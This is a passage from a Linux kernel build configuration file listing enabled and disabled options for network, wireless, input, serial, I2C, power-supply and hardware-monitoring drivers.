CONFIG_NET_VENDOR_EMULEX=y
# CONFIG_BE2NET is not set
CONFIG_NET_VENDOR_EZCHIP=y
CONFIG_NET_VENDOR_FUJITSU=y
# CONFIG_PCMCIA_FMVJ18X is not set
CONFIG_NET_VENDOR_HP=y
# CONFIG_HP100 is not set
CONFIG_NET_VENDOR_HUAWEI=y
# CONFIG_HINIC is not set
CONFIG_NET_VENDOR_I825XX=y
CONFIG_NET_VENDOR_INTEL=y
CONFIG_E100=y
CONFIG_E1000=y
CONFIG_E1000E=y
CONFIG_E1000E_HWTS=y
# CONFIG_IGB is not set
# CONFIG_IGBVF is not set
# CONFIG_IXGB is not set
# CONFIG_IXGBE is not set
# CONFIG_IXGBEVF is not set
# CONFIG_I40E is not set
# CONFIG_I40EVF is not set
# CONFIG_ICE is not set
# CONFIG_FM10K is not set
# CONFIG_JME is not set
CONFIG_NET_VENDOR_MARVELL=y
# CONFIG_MVMDIO is not set
# CONFIG_SKGE is not set
CONFIG_SKY2=y
# CONFIG_SKY2_DEBUG is not set
CONFIG_NET_VENDOR_MELLANOX=y
# CONFIG_MLX4_EN is not set
# CONFIG_MLX5_CORE is not set
# CONFIG_MLXSW_CORE is not set
# CONFIG_MLXFW is not set
CONFIG_NET_VENDOR_MICREL=y
# CONFIG_KS8842 is not set
# CONFIG_KS8851_MLL is not set
# CONFIG_KSZ884X_PCI is not set
CONFIG_NET_VENDOR_MICROSEMI=y
CONFIG_NET_VENDOR_MYRI=y
# CONFIG_MYRI10GE is not set
# CONFIG_FEALNX is not set
CONFIG_NET_VENDOR_NATSEMI=y
# CONFIG_NATSEMI is not set
# CONFIG_NS83820 is not set
CONFIG_NET_VENDOR_NETERION=y
# CONFIG_S2IO is not set
# CONFIG_VXGE is not set
CONFIG_NET_VENDOR_NETRONOME=y
# CONFIG_NFP is not set
CONFIG_NET_VENDOR_NI=y
CONFIG_NET_VENDOR_8390=y
# CONFIG_PCMCIA_AXNET is not set
# CONFIG_NE2K_PCI is not set
# CONFIG_PCMCIA_PCNET is not set
CONFIG_NET_VENDOR_NVIDIA=y
CONFIG_FORCEDETH=y
CONFIG_NET_VENDOR_OKI=y
# CONFIG_ETHOC is not set
CONFIG_NET_VENDOR_PACKET_ENGINES=y
# CONFIG_HAMACHI is not set
# CONFIG_YELLOWFIN is not set
CONFIG_NET_VENDOR_QLOGIC=y
# CONFIG_QLA3XXX is not set
# CONFIG_QLCNIC is not set
# CONFIG_QLGE is not set
# CONFIG_NETXEN_NIC is not set
# CONFIG_QED is not set
CONFIG_NET_VENDOR_QUALCOMM=y
# CONFIG_QCOM_EMAC is not set
# CONFIG_RMNET is not set
CONFIG_NET_VENDOR_RDC=y
# CONFIG_R6040 is not set
CONFIG_NET_VENDOR_REALTEK=y
# CONFIG_8139CP is not set
CONFIG_8139TOO=y
CONFIG_8139TOO_PIO=y
# CONFIG_8139TOO_TUNE_TWISTER is not set
# CONFIG_8139TOO_8129 is not set
# CONFIG_8139_OLD_RX_RESET is not set
CONFIG_R8169=y
CONFIG_NET_VENDOR_RENESAS=y
CONFIG_NET_VENDOR_ROCKER=y
CONFIG_NET_VENDOR_SAMSUNG=y
# CONFIG_SXGBE_ETH is not set
CONFIG_NET_VENDOR_SEEQ=y
CONFIG_NET_VENDOR_SOLARFLARE=y
# CONFIG_SFC is not set
# CONFIG_SFC_FALCON is not set
CONFIG_NET_VENDOR_SILAN=y
# CONFIG_SC92031 is not set
CONFIG_NET_VENDOR_SIS=y
# CONFIG_SIS900 is not set
# CONFIG_SIS190 is not set
CONFIG_NET_VENDOR_SMSC=y
# CONFIG_PCMCIA_SMC91C92 is not set
# CONFIG_EPIC100 is not set
# CONFIG_SMSC911X is not set
# CONFIG_SMSC9420 is not set
CONFIG_NET_VENDOR_SOCIONEXT=y
CONFIG_NET_VENDOR_STMICRO=y
# CONFIG_STMMAC_ETH is not set
CONFIG_NET_VENDOR_SUN=y
# CONFIG_HAPPYMEAL is not set
# CONFIG_SUNGEM is not set
# CONFIG_CASSINI is not set
# CONFIG_NIU is not set
CONFIG_NET_VENDOR_SYNOPSYS=y
# CONFIG_DWC_XLGMAC is not set
CONFIG_NET_VENDOR_TEHUTI=y
# CONFIG_TEHUTI is not set
CONFIG_NET_VENDOR_TI=y
# CONFIG_TI_CPSW_ALE is not set
# CONFIG_TLAN is not set
CONFIG_NET_VENDOR_VIA=y
# CONFIG_VIA_RHINE is not set
# CONFIG_VIA_VELOCITY is not set
CONFIG_NET_VENDOR_WIZNET=y
# CONFIG_WIZNET_W5100 is not set
# CONFIG_WIZNET_W5300 is not set
CONFIG_NET_VENDOR_XIRCOM=y
# CONFIG_PCMCIA_XIRC2PS is not set
CONFIG_FDDI=y
# CONFIG_DEFXX is not set
# CONFIG_SKFP is not set
# CONFIG_HIPPI is not set
# CONFIG_NET_SB1000 is not set
CONFIG_MDIO_DEVICE=y
CONFIG_MDIO_BUS=y
# CONFIG_MDIO_BCM_UNIMAC is not set
# CONFIG_MDIO_BITBANG is not set
# CONFIG_MDIO_MSCC_MIIM is not set
# CONFIG_MDIO_THUNDER is not set
CONFIG_PHYLIB=y
# CONFIG_LED_TRIGGER_PHY is not set

#
# MII PHY device drivers
#
# CONFIG_AMD_PHY is not set
# CONFIG_AQUANTIA_PHY is not set
# CONFIG_AX88796B_PHY is not set
# CONFIG_AT803X_PHY is not set
# CONFIG_BCM7XXX_PHY is not set
# CONFIG_BCM87XX_PHY is not set
# CONFIG_BROADCOM_PHY is not set
# CONFIG_CICADA_PHY is not set
# CONFIG_CORTINA_PHY is not set
# CONFIG_DAVICOM_PHY is not set
# CONFIG_DP83822_PHY is not set
# CONFIG_DP83TC811_PHY is not set
# CONFIG_DP83848_PHY is not set
# CONFIG_DP83867_PHY is not set
# CONFIG_FIXED_PHY is not set
# CONFIG_ICPLUS_PHY is not set
# CONFIG_INTEL_XWAY_PHY is not set
# CONFIG_LSI_ET1011C_PHY is not set
# CONFIG_LXT_PHY is not set
# CONFIG_MARVELL_PHY is not set
# CONFIG_MARVELL_10G_PHY is not set
# CONFIG_MICREL_PHY is not set
# CONFIG_MICROCHIP_PHY is not set
# CONFIG_MICROCHIP_T1_PHY is not set
# CONFIG_MICROSEMI_PHY is not set
# CONFIG_NATIONAL_PHY is not set
# CONFIG_QSEMI_PHY is not set
CONFIG_REALTEK_PHY=y
# CONFIG_RENESAS_PHY is not set
# CONFIG_ROCKCHIP_PHY is not set
# CONFIG_SMSC_PHY is not set
# CONFIG_STE10XP is not set
# CONFIG_TERANETICS_PHY is not set
# CONFIG_VITESSE_PHY is not set
# CONFIG_XILINX_GMII2RGMII is not set
# CONFIG_PPP is not set
# CONFIG_SLIP is not set
CONFIG_USB_NET_DRIVERS=y
# CONFIG_USB_CATC is not set
# CONFIG_USB_KAWETH is not set
# CONFIG_USB_PEGASUS is not set
# CONFIG_USB_RTL8150 is not set
# CONFIG_USB_RTL8152 is not set
# CONFIG_USB_LAN78XX is not set
# CONFIG_USB_USBNET is not set
# CONFIG_USB_HSO is not set
# CONFIG_USB_IPHETH is not set
CONFIG_WLAN=y
CONFIG_WLAN_VENDOR_ADMTEK=y
# CONFIG_ADM8211 is not set
CONFIG_WLAN_VENDOR_ATH=y
# CONFIG_ATH_DEBUG is not set
# CONFIG_ATH5K is not set
# CONFIG_ATH5K_PCI is not set
# CONFIG_ATH9K is not set
# CONFIG_ATH9K_HTC is not set
# CONFIG_CARL9170 is not set
# CONFIG_ATH6KL is not set
# CONFIG_AR5523 is not set
# CONFIG_WIL6210 is not set
# CONFIG_ATH10K is not set
# CONFIG_WCN36XX is not set
CONFIG_WLAN_VENDOR_ATMEL=y
# CONFIG_ATMEL is not set
# CONFIG_AT76C50X_USB is not set
CONFIG_WLAN_VENDOR_BROADCOM=y
# CONFIG_B43 is not set
# CONFIG_B43LEGACY is not set
# CONFIG_BRCMSMAC is not set
# CONFIG_BRCMFMAC is not set
CONFIG_WLAN_VENDOR_CISCO=y
# CONFIG_AIRO is not set
# CONFIG_AIRO_CS is not set
CONFIG_WLAN_VENDOR_INTEL=y
# CONFIG_IPW2100 is not set
# CONFIG_IPW2200 is not set
# CONFIG_IWL4965 is not set
# CONFIG_IWL3945 is not set
# CONFIG_IWLWIFI is not set
CONFIG_WLAN_VENDOR_INTERSIL=y
# CONFIG_HOSTAP is not set
# CONFIG_HERMES is not set
# CONFIG_P54_COMMON is not set
# CONFIG_PRISM54 is not set
CONFIG_WLAN_VENDOR_MARVELL=y
# CONFIG_LIBERTAS is not set
# CONFIG_LIBERTAS_THINFIRM is not set
# CONFIG_MWIFIEX is not set
# CONFIG_MWL8K is not set
CONFIG_WLAN_VENDOR_MEDIATEK=y
# CONFIG_MT7601U is not set
# CONFIG_MT76x0U is not set
# CONFIG_MT76x2E is not set
# CONFIG_MT76x2U is not set
CONFIG_WLAN_VENDOR_RALINK=y
# CONFIG_RT2X00 is not set
CONFIG_WLAN_VENDOR_REALTEK=y
# CONFIG_RTL8180 is not set
# CONFIG_RTL8187 is not set
CONFIG_RTL_CARDS=y
# CONFIG_RTL8192CE is not set
# CONFIG_RTL8192SE is not set
# CONFIG_RTL8192DE is not set
# CONFIG_RTL8723AE is not set
# CONFIG_RTL8723BE is not set
# CONFIG_RTL8188EE is not set
# CONFIG_RTL8192EE is not set
# CONFIG_RTL8821AE is not set
# CONFIG_RTL8192CU is not set
# CONFIG_RTL8XXXU is not set
CONFIG_WLAN_VENDOR_RSI=y
# CONFIG_RSI_91X is not set
CONFIG_WLAN_VENDOR_ST=y
# CONFIG_CW1200 is not set
CONFIG_WLAN_VENDOR_TI=y
# CONFIG_WL1251 is not set
# CONFIG_WL12XX is not set
# CONFIG_WL18XX is not set
# CONFIG_WLCORE is not set
CONFIG_WLAN_VENDOR_ZYDAS=y
# CONFIG_USB_ZD1201 is not set
# CONFIG_ZD1211RW is not set
CONFIG_WLAN_VENDOR_QUANTENNA=y
# CONFIG_QTNFMAC_PEARL_PCIE is not set
# CONFIG_PCMCIA_RAYCS is not set
# CONFIG_PCMCIA_WL3501 is not set
# CONFIG_MAC80211_HWSIM is not set
# CONFIG_USB_NET_RNDIS_WLAN is not set

#
# Enable WiMAX (Networking options) to see the WiMAX drivers
#
# CONFIG_WAN is not set
# CONFIG_VMXNET3 is not set
# CONFIG_FUJITSU_ES is not set
# CONFIG_NETDEVSIM is not set
# CONFIG_NET_FAILOVER is not set
# CONFIG_ISDN is not set

#
# Input device support
#
CONFIG_INPUT=y
CONFIG_INPUT_LEDS=y
CONFIG_INPUT_FF_MEMLESS=y
CONFIG_INPUT_POLLDEV=y
CONFIG_INPUT_SPARSEKMAP=y
# CONFIG_INPUT_MATRIXKMAP is not set

#
# Userland interfaces
#
# CONFIG_INPUT_MOUSEDEV is not set
# CONFIG_INPUT_JOYDEV is not set
CONFIG_INPUT_EVDEV=y
# CONFIG_INPUT_EVBUG is not set

#
# Input Device Drivers
#
CONFIG_INPUT_KEYBOARD=y
# CONFIG_KEYBOARD_ADP5588 is not set
# CONFIG_KEYBOARD_ADP5589 is not set
CONFIG_KEYBOARD_ATKBD=y
# CONFIG_KEYBOARD_QT1070 is not set
# CONFIG_KEYBOARD_QT2160 is not set
# CONFIG_KEYBOARD_DLINK_DIR685 is not set
# CONFIG_KEYBOARD_LKKBD is not set
# CONFIG_KEYBOARD_TCA6416 is not set
# CONFIG_KEYBOARD_TCA8418 is not set
# CONFIG_KEYBOARD_LM8323 is not set
# CONFIG_KEYBOARD_LM8333 is not set
# CONFIG_KEYBOARD_MAX7359 is not set
# CONFIG_KEYBOARD_MCS is not set
# CONFIG_KEYBOARD_MPR121 is not set
# CONFIG_KEYBOARD_NEWTON is not set
# CONFIG_KEYBOARD_OPENCORES is not set
# CONFIG_KEYBOARD_SAMSUNG is not set
# CONFIG_KEYBOARD_STOWAWAY is not set
# CONFIG_KEYBOARD_SUNKBD is not set
# CONFIG_KEYBOARD_TM2_TOUCHKEY is not set
# CONFIG_KEYBOARD_XTKBD is not set
CONFIG_INPUT_MOUSE=y
CONFIG_MOUSE_PS2=y
CONFIG_MOUSE_PS2_ALPS=y
CONFIG_MOUSE_PS2_BYD=y
CONFIG_MOUSE_PS2_LOGIPS2PP=y
CONFIG_MOUSE_PS2_SYNAPTICS=y
CONFIG_MOUSE_PS2_SYNAPTICS_SMBUS=y
CONFIG_MOUSE_PS2_CYPRESS=y
CONFIG_MOUSE_PS2_LIFEBOOK=y
CONFIG_MOUSE_PS2_TRACKPOINT=y
# CONFIG_MOUSE_PS2_ELANTECH is not set
# CONFIG_MOUSE_PS2_SENTELIC is not set
# CONFIG_MOUSE_PS2_TOUCHKIT is not set
CONFIG_MOUSE_PS2_FOCALTECH=y
CONFIG_MOUSE_PS2_SMBUS=y
# CONFIG_MOUSE_SERIAL is not set
# CONFIG_MOUSE_APPLETOUCH is not set
# CONFIG_MOUSE_BCM5974 is not set
# CONFIG_MOUSE_CYAPA is not set
# CONFIG_MOUSE_ELAN_I2C is not set
# CONFIG_MOUSE_VSXXXAA is not set
# CONFIG_MOUSE_SYNAPTICS_I2C is not set
# CONFIG_MOUSE_SYNAPTICS_USB is not set
CONFIG_INPUT_JOYSTICK=y
# CONFIG_JOYSTICK_ANALOG is not set
# CONFIG_JOYSTICK_A3D is not set
# CONFIG_JOYSTICK_ADI is not set
# CONFIG_JOYSTICK_COBRA is not set
# CONFIG_JOYSTICK_GF2K is not set
# CONFIG_JOYSTICK_GRIP is not set
# CONFIG_JOYSTICK_GRIP_MP is not set
# CONFIG_JOYSTICK_GUILLEMOT is not set
# CONFIG_JOYSTICK_INTERACT is not set
# CONFIG_JOYSTICK_SIDEWINDER is not set
# CONFIG_JOYSTICK_TMDC is not set
# CONFIG_JOYSTICK_IFORCE is not set
# CONFIG_JOYSTICK_WARRIOR is not set
# CONFIG_JOYSTICK_MAGELLAN is not set
# CONFIG_JOYSTICK_SPACEORB is not set
# CONFIG_JOYSTICK_SPACEBALL is not set
# CONFIG_JOYSTICK_STINGER is not set
# CONFIG_JOYSTICK_TWIDJOY is not set
# CONFIG_JOYSTICK_ZHENHUA is not set
# CONFIG_JOYSTICK_AS5011 is not set
# CONFIG_JOYSTICK_JOYDUMP is not set
# CONFIG_JOYSTICK_XPAD is not set
# CONFIG_JOYSTICK_PXRC is not set
CONFIG_INPUT_TABLET=y
# CONFIG_TABLET_USB_ACECAD is not set
# CONFIG_TABLET_USB_AIPTEK is not set
# CONFIG_TABLET_USB_GTCO is not set
# CONFIG_TABLET_USB_HANWANG is not set
# CONFIG_TABLET_USB_KBTAB is not set
# CONFIG_TABLET_USB_PEGASUS is not set
# CONFIG_TABLET_SERIAL_WACOM4 is not set
CONFIG_INPUT_TOUCHSCREEN=y
CONFIG_TOUCHSCREEN_PROPERTIES=y
# CONFIG_TOUCHSCREEN_AD7879 is not set
# CONFIG_TOUCHSCREEN_ATMEL_MXT is not set
# CONFIG_TOUCHSCREEN_BU21013 is not set
# CONFIG_TOUCHSCREEN_BU21029 is not set
# CONFIG_TOUCHSCREEN_CHIPONE_ICN8505 is not set
# CONFIG_TOUCHSCREEN_CYTTSP_CORE is not set
# CONFIG_TOUCHSCREEN_CYTTSP4_CORE is not set
# CONFIG_TOUCHSCREEN_DYNAPRO is not set
# CONFIG_TOUCHSCREEN_HAMPSHIRE is not set
# CONFIG_TOUCHSCREEN_EETI is not set
# CONFIG_TOUCHSCREEN_EGALAX_SERIAL is not set
# CONFIG_TOUCHSCREEN_EXC3000 is not set
# CONFIG_TOUCHSCREEN_FUJITSU is not set
# CONFIG_TOUCHSCREEN_HIDEEP is not set
# CONFIG_TOUCHSCREEN_ILI210X is not set
# CONFIG_TOUCHSCREEN_S6SY761 is not set
# CONFIG_TOUCHSCREEN_GUNZE is not set
# CONFIG_TOUCHSCREEN_EKTF2127 is not set
# CONFIG_TOUCHSCREEN_ELAN is not set
# CONFIG_TOUCHSCREEN_ELO is not set
# CONFIG_TOUCHSCREEN_WACOM_W8001 is not set
# CONFIG_TOUCHSCREEN_WACOM_I2C is not set
# CONFIG_TOUCHSCREEN_MAX11801 is not set
# CONFIG_TOUCHSCREEN_MCS5000 is not set
# CONFIG_TOUCHSCREEN_MMS114 is not set
# CONFIG_TOUCHSCREEN_MELFAS_MIP4 is not set
# CONFIG_TOUCHSCREEN_MTOUCH is not set
# CONFIG_TOUCHSCREEN_INEXIO is not set
# CONFIG_TOUCHSCREEN_MK712 is not set
# CONFIG_TOUCHSCREEN_PENMOUNT is not set
# CONFIG_TOUCHSCREEN_EDT_FT5X06 is not set
# CONFIG_TOUCHSCREEN_TOUCHRIGHT is not set
# CONFIG_TOUCHSCREEN_TOUCHWIN is not set
# CONFIG_TOUCHSCREEN_PIXCIR is not set
# CONFIG_TOUCHSCREEN_WDT87XX_I2C is not set
# CONFIG_TOUCHSCREEN_USB_COMPOSITE is not set
# CONFIG_TOUCHSCREEN_TOUCHIT213 is not set
# CONFIG_TOUCHSCREEN_TSC_SERIO is not set
# CONFIG_TOUCHSCREEN_TSC2004 is not set
# CONFIG_TOUCHSCREEN_TSC2007 is not set
# CONFIG_TOUCHSCREEN_SILEAD is not set
# CONFIG_TOUCHSCREEN_ST1232 is not set
# CONFIG_TOUCHSCREEN_STMFTS is not set
# CONFIG_TOUCHSCREEN_SX8654 is not set
# CONFIG_TOUCHSCREEN_TPS6507X is not set
# CONFIG_TOUCHSCREEN_ZET6223 is not set
# CONFIG_TOUCHSCREEN_ROHM_BU21023 is not set
CONFIG_INPUT_MISC=y
# CONFIG_INPUT_AD714X is not set
# CONFIG_INPUT_BMA150 is not set
# CONFIG_INPUT_E3X0_BUTTON is not set
# CONFIG_INPUT_PCSPKR is not set
# CONFIG_INPUT_MMA8450 is not set
# CONFIG_INPUT_APANEL is not set
# CONFIG_INPUT_ATLAS_BTNS is not set
# CONFIG_INPUT_ATI_REMOTE2 is not set
# CONFIG_INPUT_KEYSPAN_REMOTE is not set
# CONFIG_INPUT_KXTJ9 is not set
# CONFIG_INPUT_POWERMATE is not set
# CONFIG_INPUT_YEALINK is not set
# CONFIG_INPUT_CM109 is not set
# CONFIG_INPUT_UINPUT is not set
# CONFIG_INPUT_PCF8574 is not set
# CONFIG_INPUT_ADXL34X is not set
# CONFIG_INPUT_IMS_PCU is not set
# CONFIG_INPUT_CMA3000 is not set
# CONFIG_INPUT_IDEAPAD_SLIDEBAR is not set
# CONFIG_INPUT_DRV2665_HAPTICS is not set
# CONFIG_INPUT_DRV2667_HAPTICS is not set
# CONFIG_RMI4_CORE is not set

#
# Hardware I/O ports
#
CONFIG_SERIO=y
CONFIG_ARCH_MIGHT_HAVE_PC_SERIO=y
CONFIG_SERIO_I8042=y
CONFIG_SERIO_SERPORT=y
# CONFIG_SERIO_CT82C710 is not set
# CONFIG_SERIO_PCIPS2 is not set
CONFIG_SERIO_LIBPS2=y
# CONFIG_SERIO_RAW is not set
# CONFIG_SERIO_ALTERA_PS2 is not set
# CONFIG_SERIO_PS2MULT is not set
# CONFIG_SERIO_ARC_PS2 is not set
# CONFIG_USERIO is not set
# CONFIG_GAMEPORT is not set

#
# Character devices
#
CONFIG_TTY=y
CONFIG_VT=y
CONFIG_CONSOLE_TRANSLATIONS=y
CONFIG_VT_CONSOLE=y
CONFIG_VT_CONSOLE_SLEEP=y
CONFIG_HW_CONSOLE=y
CONFIG_VT_HW_CONSOLE_BINDING=y
CONFIG_UNIX98_PTYS=y
# CONFIG_LEGACY_PTYS is not set
CONFIG_SERIAL_NONSTANDARD=y
# CONFIG_ROCKETPORT is not set
# CONFIG_CYCLADES is not set
# CONFIG_MOXA_INTELLIO is not set
# CONFIG_MOXA_SMARTIO is not set
# CONFIG_SYNCLINK is not set
# CONFIG_SYNCLINKMP is not set
# CONFIG_SYNCLINK_GT is not set
# CONFIG_NOZOMI is not set
# CONFIG_ISI is not set
# CONFIG_N_HDLC is not set
# CONFIG_N_GSM is not set
# CONFIG_TRACE_SINK is not set
CONFIG_LDISC_AUTOLOAD=y
CONFIG_DEVMEM=y
# CONFIG_DEVKMEM is not set

#
# Serial drivers
#
CONFIG_SERIAL_EARLYCON=y
CONFIG_SERIAL_8250=y
CONFIG_SERIAL_8250_DEPRECATED_OPTIONS=y
CONFIG_SERIAL_8250_PNP=y
# CONFIG_SERIAL_8250_FINTEK is not set
CONFIG_SERIAL_8250_CONSOLE=y
CONFIG_SERIAL_8250_DMA=y
CONFIG_SERIAL_8250_PCI=y
CONFIG_SERIAL_8250_EXAR=y
# CONFIG_SERIAL_8250_CS is not set
CONFIG_SERIAL_8250_NR_UARTS=32
CONFIG_SERIAL_8250_RUNTIME_UARTS=4
CONFIG_SERIAL_8250_EXTENDED=y
CONFIG_SERIAL_8250_MANY_PORTS=y
CONFIG_SERIAL_8250_SHARE_IRQ=y
CONFIG_SERIAL_8250_DETECT_IRQ=y
CONFIG_SERIAL_8250_RSA=y
# CONFIG_SERIAL_8250_DW is not set
# CONFIG_SERIAL_8250_RT288X is not set
CONFIG_SERIAL_8250_LPSS=y
CONFIG_SERIAL_8250_MID=y
# CONFIG_SERIAL_8250_MOXA is not set

#
# Non-8250 serial port support
#
# CONFIG_SERIAL_UARTLITE is not set
CONFIG_SERIAL_CORE=y
CONFIG_SERIAL_CORE_CONSOLE=y
# CONFIG_SERIAL_JSM is not set
# CONFIG_SERIAL_SCCNXP is not set
# CONFIG_SERIAL_SC16IS7XX is not set
# CONFIG_SERIAL_ALTERA_JTAGUART is not set
# CONFIG_SERIAL_ALTERA_UART is not set
# CONFIG_SERIAL_ARC is not set
# CONFIG_SERIAL_RP2 is not set
# CONFIG_SERIAL_FSL_LPUART is not set
# CONFIG_SERIAL_DEV_BUS is not set
# CONFIG_IPMI_HANDLER is not set
CONFIG_HW_RANDOM=y
# CONFIG_HW_RANDOM_TIMERIOMEM is not set
# CONFIG_HW_RANDOM_INTEL is not set
# CONFIG_HW_RANDOM_AMD is not set
CONFIG_HW_RANDOM_VIA=y
CONFIG_NVRAM=y
# CONFIG_APPLICOM is not set

#
# PCMCIA character devices
#
# CONFIG_SYNCLINK_CS is not set
# CONFIG_CARDMAN_4000 is not set
# CONFIG_CARDMAN_4040 is not set
# CONFIG_SCR24X is not set
# CONFIG_IPWIRELESS is not set
# CONFIG_MWAVE is not set
# CONFIG_RAW_DRIVER is not set
CONFIG_HPET=y
# CONFIG_HPET_MMAP is not set
# CONFIG_HANGCHECK_TIMER is not set
# CONFIG_TCG_TPM is not set
# CONFIG_TELCLOCK is not set
CONFIG_DEVPORT=y
# CONFIG_XILLYBUS is not set
CONFIG_RANDOM_TRUST_CPU=y
CONFIG_RANDOM_TRUST_BOOTLOADER=y

#
# I2C support
#
CONFIG_I2C=y
CONFIG_ACPI_I2C_OPREGION=y
CONFIG_I2C_BOARDINFO=y
CONFIG_I2C_COMPAT=y
# CONFIG_I2C_CHARDEV is not set
# CONFIG_I2C_MUX is not set
CONFIG_I2C_HELPER_AUTO=y
CONFIG_I2C_SMBUS=y
CONFIG_I2C_ALGOBIT=y

#
# I2C Hardware Bus support
#

#
# PC SMBus host controller drivers
#
# CONFIG_I2C_ALI1535 is not set
# CONFIG_I2C_ALI1563 is not set
# CONFIG_I2C_ALI15X3 is not set
# CONFIG_I2C_AMD756 is not set
# CONFIG_I2C_AMD8111 is not set
CONFIG_I2C_I801=y
# CONFIG_I2C_ISCH is not set
# CONFIG_I2C_ISMT is not set
# CONFIG_I2C_PIIX4 is not set
# CONFIG_I2C_NFORCE2 is not set
# CONFIG_I2C_SIS5595 is not set
# CONFIG_I2C_SIS630 is not set
# CONFIG_I2C_SIS96X is not set
# CONFIG_I2C_VIA is not set
# CONFIG_I2C_VIAPRO is not set

#
# ACPI drivers
#
# CONFIG_I2C_SCMI is not set

#
# I2C system bus drivers (mostly embedded / system-on-chip)
#
# CONFIG_I2C_DESIGNWARE_PLATFORM is not set
# CONFIG_I2C_DESIGNWARE_PCI is not set
# CONFIG_I2C_EMEV2 is not set
# CONFIG_I2C_OCORES is not set
# CONFIG_I2C_PCA_PLATFORM is not set
# CONFIG_I2C_SIMTEC is not set
# CONFIG_I2C_XILINX is not set

#
# External I2C/SMBus adapter drivers
#
# CONFIG_I2C_DIOLAN_U2C is not set
# CONFIG_I2C_PARPORT_LIGHT is not set
# CONFIG_I2C_ROBOTFUZZ_OSIF is not set
# CONFIG_I2C_TAOS_EVM is not set
# CONFIG_I2C_TINY_USB is not set

#
# Other I2C/SMBus bus drivers
#
# CONFIG_I2C_MLXCPLD is not set
# CONFIG_I2C_STUB is not set
# CONFIG_I2C_SLAVE is not set
# CONFIG_I2C_DEBUG_CORE is not set
# CONFIG_I2C_DEBUG_ALGO is not set
# CONFIG_I2C_DEBUG_BUS is not set
# CONFIG_SPI is not set
# CONFIG_SPMI is not set
# CONFIG_HSI is not set
CONFIG_PPS=y
# CONFIG_PPS_DEBUG is not set

#
# PPS clients support
#
# CONFIG_PPS_CLIENT_KTIMER is not set
# CONFIG_PPS_CLIENT_LDISC is not set
# CONFIG_PPS_CLIENT_GPIO is not set

#
# PPS generators support
#

#
# PTP clock support
#
CONFIG_PTP_1588_CLOCK=y

#
# Enable PHYLIB and NETWORK_PHY_TIMESTAMPING to see the additional clocks.
#
# CONFIG_PINCTRL is not set
# CONFIG_GPIOLIB is not set
# CONFIG_W1 is not set
# CONFIG_POWER_AVS is not set
# CONFIG_POWER_RESET is not set
CONFIG_POWER_SUPPLY=y
# CONFIG_POWER_SUPPLY_DEBUG is not set
# CONFIG_PDA_POWER is not set
# CONFIG_TEST_POWER is not set
# CONFIG_CHARGER_ADP5061 is not set
# CONFIG_BATTERY_DS2780 is not set
# CONFIG_BATTERY_DS2781 is not set
# CONFIG_BATTERY_DS2782 is not set
# CONFIG_BATTERY_SBS is not set
# CONFIG_CHARGER_SBS is not set
# CONFIG_BATTERY_BQ27XXX is not set
# CONFIG_BATTERY_MAX17040 is not set
# CONFIG_BATTERY_MAX17042 is not set
# CONFIG_CHARGER_MAX8903 is not set
# CONFIG_CHARGER_LP8727 is not set
# CONFIG_CHARGER_BQ2415X is not set
# CONFIG_CHARGER_SMB347 is not set
# CONFIG_BATTERY_GAUGE_LTC2941 is not set
# CONFIG_BATTERY_RT5033 is not set
CONFIG_HWMON=y
# CONFIG_HWMON_DEBUG_CHIP is not set

#
# Native drivers
#
# CONFIG_SENSORS_ABITUGURU is not set
# CONFIG_SENSORS_ABITUGURU3 is not set
# CONFIG_SENSORS_AD7414 is not set
# CONFIG_SENSORS_AD7418 is not set
# CONFIG_SENSORS_ADM1021 is not set
# CONFIG_SENSORS_ADM1025 is not set
# CONFIG_SENSORS_ADM1026 is not set
# CONFIG_SENSORS_ADM1029 is not set
# CONFIG_SENSORS_ADM1031 is not set
# CONFIG_SENSORS_ADM9240 is not set
# CONFIG_SENSORS_ADT7410 is not set
# CONFIG_SENSORS_ADT7411 is not set
# CONFIG_SENSORS_ADT7462 is not set
# CONFIG_SENSORS_ADT7470 is not set
# CONFIG_SENSORS_ADT7475 is not set
# CONFIG_SENSORS_ASC7621 is not set
# CONFIG_SENSORS_K8TEMP is not set
# CONFIG_SENSORS_K10TEMP is not set
# CONFIG_SENSORS_FAM15H_POWER is not set
# CONFIG_SENSORS_APPLESMC is not set
# CONFIG_SENSORS_ASB100 is not set
# CONFIG_SENSORS_ASPEED is not set
# CONFIG_SENSORS_ATXP1 is not set
# CONFIG_SENSORS_DS620 is not set
# CONFIG_SENSORS_DS1621 is not set
# CONFIG_SENSORS_DELL_SMM is not set
# CONFIG_SENSORS_I5K_AMB is not set
# CONFIG_SENSORS_F71805F is not set
# CONFIG_SENSORS_F71882FG is not set
# CONFIG_SENSORS_F75375S is not set
# CONFIG_SENSORS_FSCHMD is not set
# CONFIG_SENSORS_FTSTEUTATES is not set
# CONFIG_SENSORS_GL518SM is not set
# CONFIG_SENSORS_GL520SM is not set
# CONFIG_SENSORS_G760A is not set
# CONFIG_SENSORS_G762 is not set
# CONFIG_SENSORS_HIH6130 is not set
# CONFIG_SENSORS_I5500 is not set
# CONFIG_SENSORS_CORETEMP is not set
# CONFIG_SENSORS_IT87 is not set
# CONFIG_SENSORS_JC42 is not set
# CONFIG_SENSORS_POWR1220 is not set
# CONFIG_SENSORS_LINEAGE is not set
# CONFIG_SENSORS_LTC2945 is not set
# CONFIG_SENSORS_LTC2990 is not set
# CONFIG_SENSORS_LTC4151 is not set
# CONFIG_SENSORS_LTC4215 is not set
# CONFIG_SENSORS_LTC4222 is not set
# CONFIG_SENSORS_LTC4245 is not set
# CONFIG_SENSORS_LTC4260 is not set
# CONFIG_SENSORS_LTC4261 is not set
# CONFIG_SENSORS_MAX16065 is not set
# CONFIG_SENSORS_MAX1619 is not set
# CONFIG_SENSORS_MAX1668 is not set
# CONFIG_SENSORS_MAX197 is not set
# CONFIG_SENSORS_MAX6621 is not set
# CONFIG_SENSORS_MAX6639 is not set
# CONFIG_SENSORS_MAX6642 is not set
# CONFIG_SENSORS_MAX6650 is not set
# CONFIG_SENSORS_MAX6697 is not set
# CONFIG_SENSORS_MAX31790 is not set
# CONFIG_SENSORS_MCP3021 is not set
# CONFIG_SENSORS_TC654 is not set
# CONFIG_SENSORS_LM63 is not set
# CONFIG_SENSORS_LM73 is not set
# CONFIG_SENSORS_LM75 is not set
# CONFIG_SENSORS_LM77 is not set
# CONFIG_SENSORS_LM78 is not set
# CONFIG_SENSORS_LM80 is not set
# CONFIG_SENSORS_LM83 is not set
# CONFIG_SENSORS_LM85 is not set
# CONFIG_SENSORS_LM87 is not set
# CONFIG_SENSORS_LM90 is not set
# CONFIG_SENSORS_LM92 is not set
# CONFIG_SENSORS_LM93 is not set
# CONFIG_SENSORS_LM95234 is not set
